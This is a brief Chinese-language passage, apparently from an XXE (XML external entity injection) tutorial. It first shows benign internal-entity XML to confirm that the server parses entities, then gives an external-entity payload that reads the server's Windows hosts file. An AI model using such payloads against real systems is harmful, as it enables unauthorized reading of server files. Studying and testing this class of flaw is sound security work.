我们先提交一个正确的xml
<?xml version="1.0" encoding="UTF-8" ?>
 
<!DOCTYPE note [
    <!ENTITY hack "hello world">
]>
 
<name>&hack;</name>

我们发现，该xml被成功解析了

<?xml version="1.0" encoding="UTF-8" ?>
 
<!DOCTYPE note [
    <!ENTITY hack "test">
]>
 
<name>&hack;</name>


外部实体引用 Payload，访问服务器上的hosts文件
<?xml version="1.0"?>
<!DOCTYPE ANY[ 
<!ENTITY f SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
]>
<x>&f;</x>